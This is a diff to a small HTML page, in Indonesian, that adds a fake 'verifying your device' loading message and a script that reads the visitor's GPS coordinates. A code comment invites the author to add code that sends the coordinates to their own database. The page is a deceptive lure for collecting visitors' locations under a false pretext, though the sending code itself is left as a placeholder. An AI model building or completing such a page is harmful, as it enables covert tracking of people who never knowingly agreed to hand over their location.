@@ -6,7 +6,19 @@
 </head>
 <body>
     <h2>Memuat Halaman...</h2>
-    <p>Mohon tunggu sebentar.</p>
-    <!-- Masukkan script pelacakan Anda di bawah sini -->
+    <p>Mohon tunggu sebentar, sistem sedang memverifikasi perangkat Anda.</p>
+
+    <script>
+        // Masukkan script pelacakan GPS/koleksi data Anda di sini
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                console.log("Latitude: " + position.coords.latitude);
+                console.log("Longitude: " + position.coords.longitude);
+                // Tambahkan kode pengiriman data (misalnya fetch/axios ke database Anda) di sini
+            }, function(error) {
+                console.log("Gagal mendeteksi lokasi: " + error.message);
+            });
+        }
+    </script>
 </body>
 </html>
